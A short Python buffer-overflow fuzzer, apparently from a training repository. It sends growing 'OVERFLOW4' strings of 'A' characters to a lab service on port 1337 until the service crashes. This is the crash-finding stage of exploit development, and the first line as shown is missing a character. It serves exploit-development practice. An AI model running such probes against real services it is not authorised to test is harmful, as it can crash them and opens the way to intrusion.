mport socket
import time
import sys

#
# opsec-infosec -- Simple Fuzzer for Python3
# https://github.com/opsec-infosec/BufferOverflow
#


header = "OVERFLOW4 "
i = 100

try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.0)
    s.connect(("192.168.100.2", 1337)) 

except Exception as ex:
    print("Error Connecting: ", ex)
    sys.exit(1)


while (i < 3000):
    try:
        filler = "A" * i
        buffer = header + filler
        s.send(buffer.encode("latin-1"))
        
        print("Header: ", len(header), " Bytes")
        print("Filler: ", len(filler), " Bytes")
        print("Sending Total: ", len(buffer), " Bytes\n")
        
        recv = s.recv(1024).decode("latin-1")
        time.sleep(1)
         
        i = i + 100

    except Exception as ex:
        print ("Error: ", ex)
        print("Header: ", len(header), " Bytes")
        print("Filler: ", len(filler), " Bytes")
        print("Sending Total: ", len(buffer), " Bytes\n")
        s.close()
        sys.exit(1)

s.close()
sys.exit(0)
